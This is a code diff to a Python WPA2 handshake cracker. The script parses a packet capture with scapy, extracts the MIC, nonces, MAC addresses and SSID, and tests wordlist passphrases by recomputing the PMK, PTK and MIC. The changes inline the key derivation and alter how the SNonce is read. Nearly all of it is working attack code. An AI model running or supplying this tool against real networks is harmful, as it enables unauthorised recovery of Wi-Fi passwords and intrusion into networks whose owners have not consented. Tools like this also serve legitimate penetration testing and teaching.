@@ -1,11 +1,10 @@
-import sys
 import hmac
 import hashlib
-from scapy.all import rdpcap, EAPOL, Dot11Beacon
 import binascii
 import argparse
+from scapy.all import rdpcap, EAPOL, Dot11Beacon
 
-# Correct WPA2 Key Expansion (PRF) Function
+# WPA2 PRF function to derive PTK (512 bits)
 def prf_512(key, a, b):
     """ WPA2 PRF function to derive PTK from PMK """
     blen = 64  # PTK is 512 bits (64 bytes)
@@ -16,17 +15,10 @@ def prf_512(key, a, b):
         i += 1
     return r[:blen]
 
-# Correct PTK Derivation Function
-def derive_ptk(pmk, anonce, snonce, sta_mac, bssid):
-    """ Derives the Pairwise Transient Key (PTK) from PMK and other parameters """
-    # Concatenation order must match WPA2 standard
-    key_data = min(sta_mac, bssid) + max(sta_mac, bssid) + min(anonce, snonce) + max(anonce, snonce)
-    return prf_512(pmk, b"Pairwise key expansion", key_data)
-
-# Extract necessary values from the pcap file
+# Extract required values from PCAP
 def extract_mic_nonce_ssid(input_file):
     packets = rdpcap(input_file)
-    
+
     snonce, mic, sta_mac, bssid, anonce, ssid = None, None, None, None, None, None
 
     for packet in packets:
@@ -34,10 +26,9 @@ def extract_mic_nonce_ssid(input_file):
             eapol_layer = packet.getlayer(EAPOL)
             if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                 mic = eapol_layer.key_mic
+                snonce = eapol_layer.key_nonce
                 print(f"Extracted MIC: {mic.hex()}")
-                if not snonce:
-                    snonce = eapol_layer.key_nonce
-                    print(f"Extracted SNonce: {snonce.hex()}")
+                print(f"Extracted SNonce: {snonce.hex()}")
 
             if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                 anonce = eapol_layer.key_nonce
@@ -73,8 +64,9 @@ def crack_psk(mic, snonce, sta_mac, bssid, anonce, ssid, wordlist):
         pmk = hashlib.pbkdf2_hmac('sha1', psk, ssid, 4096, 32)
         print(f"PMK: {pmk.hex()}")
 
-        # Generate correct PTK
-        ptk = derive_ptk(pmk, anonce, snonce, sta_mac, bssid)
+        # Correct WPA2 PTK Derivation
+        key_data = min(sta_mac, bssid) + max(sta_mac, bssid) + min(anonce, snonce) + max(anonce, snonce)
+        ptk = prf_512(pmk, b"Pairwise key expansion", key_data)
         print(f"PTK: {ptk.hex()}")
 
         # Correct MIC Calculation (use PTK[:16])
@@ -89,7 +81,7 @@ def crack_psk(mic, snonce, sta_mac, bssid, anonce, ssid, wordlist):
     print("❌ No valid PSK found in wordlist.")
     return None
 
-# Main function to parse arguments and run the script
+# Main function
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Crack WPA PSK using aircrack.py')
     parser.add_argument('capture_file', help='Capture file (CAP/PCAP)')
